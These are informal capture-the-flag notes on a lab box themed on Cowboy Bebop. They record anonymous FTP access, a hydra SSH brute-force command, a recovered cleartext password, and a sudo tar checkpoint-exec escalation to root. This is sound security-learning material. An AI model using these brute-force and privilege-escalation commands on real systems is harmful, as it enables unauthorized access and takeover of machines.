Need to restart the machine, was hanging up its ftp server.

Found information on the ftp server, possible username and password provided in clear text. 
Who wrote the task list?  
Opening the webpage up shows some dialogue from cowboy bepop and a jpb file.
May need to find hidden directories? 
Hint Have you visited FTP?
I actually don’t know how to access ftp, researching for now. 



Found https://phoenixnap.com/kb/linux-ftp

ftp 10.10.255.118


Tried the Anonymous username and logged in with no password?
Ls returned. 229 Entering Extended Passive Mode (|||10752|)?

Same issue when ftp’ing and entering passive mode. 
In doing more research with (229 Entering Extended Passive Mode) Found a video explaining a work around.

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
Task doesn’t seem helpful, but I grabbed both of the files with mget.
May be able to use the locks against a known usdername. ALtghough as of now, not really sure what the username is?
By accident, dound the username or the answer to the question in the task list.
At the end there is a “-lin”

I already see the answer for What service can you bruteforce with the text file found?

SSH

What is the users password?
Found a basic hydra command which came to 
hydra -l lin -P locks.txt 10.10.104.230 ssh

 Now that I have the username: lin and the pss: RedDr4gonSynd1cat3
I can use the command ssh lin@10.10.104.230's

Kind of weird to just ask for a root.txt folder when I only see the user.txt. Need to check permission with sudo. Command run 
lin@bountyhacker:~/Desktop$ sudo -l

User lin may run the following commands on bountyhacker:
Seems like with can run /bin/tar as root, which may open the possibility of launching a payload from a reverse shell. Previous experience in the last box where this was being asked for. 
Going back to the gtfo bins which was the original location for the payload.
Searching /bin/tar and found https://gtfobins.github.io/gtfobins/tar/

Results here. 

in@bountyhacker:~/Desktop$     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
whoami: not found

# 

    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# # tar: Removing leading `/' from member names
# # whoami
root

weird because I still only see the file which makes me thing something is wrong here, starting over.,
when running sudo -l I have all permission which is even stranger.
Starting over with the command I found the root.txt with another run through.
